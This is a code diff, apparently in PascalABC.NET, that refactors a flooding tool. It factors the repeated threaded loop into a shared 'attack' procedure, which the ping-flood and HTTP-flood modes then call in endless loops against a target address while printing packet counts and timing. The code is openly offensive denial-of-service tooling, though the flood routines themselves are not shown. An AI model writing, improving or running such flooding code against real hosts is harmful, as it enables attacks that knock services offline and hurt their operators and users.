@@ -58,6 +58,20 @@ begin
   w.DownloadString(address);
 end;
 
+procedure attack(pr: procedure);
+begin
+  for var i := 0 to tb.Length - 1 do
+    tb[i] := Task.Factory.StartNew((new thread(pr)).load);
+  if tb[tb.Length - 1].Result then
+  begin
+    GotoXY(1, 7);
+    ClearLine;
+    GotoXY(1, 7);
+    Writeln('+' + thread_k + ' packages in ' + MillisecondsDelta + ' ms.');
+    Writeln('Total: ' + thread_sum + ' packages in ' + (Milliseconds - t) / 1000 + 's.');
+  end;
+end;
+
 begin
   try
     d := DateTime.Now;
@@ -111,35 +125,13 @@ begin
         begin
           log('Start ping-flood attack ' + address);
           while true do
-          begin
-            for var i := 0 to tb.Length - 1 do
-              tb[i] := Task.Factory.StartNew((new thread(ping_flood_attack)).load);
-            if tb[tb.Length - 1].Result then
-            begin
-              GotoXY(1, 7);
-              ClearLine;
-              GotoXY(1, 7);
-              Writeln('+' + thread_k + ' packages in ' + MillisecondsDelta + ' ms.');
-              Writeln('Total: ' + thread_sum + ' packages in ' + (Milliseconds - t) / 1000 + 's.');
-            end;
-          end;
+            attack(ping_flood_attack);
         end;
       1:
         begin
           log('Start HTTP-flood attack ' + address);
           while true do
-          begin
-            for var i := 0 to tb.Length - 1 do
-              tb[i] := Task.Factory.StartNew((new thread(http_flood_attack)).load);
-            if tb[tb.Length - 1].Result then
-            begin
-              GotoXY(1, 7);
-              ClearLine;
-              GotoXY(1, 7);
-              Writeln('+' + thread_k + ' packages in ' + MillisecondsDelta + ' ms.');
-              Writeln('Total: ' + thread_sum + ' packages in ' + (Milliseconds - t) / 1000 + ' s.');
-            end;
-          end;
+            attack(http_flood_attack);
         end;
     end;
   except
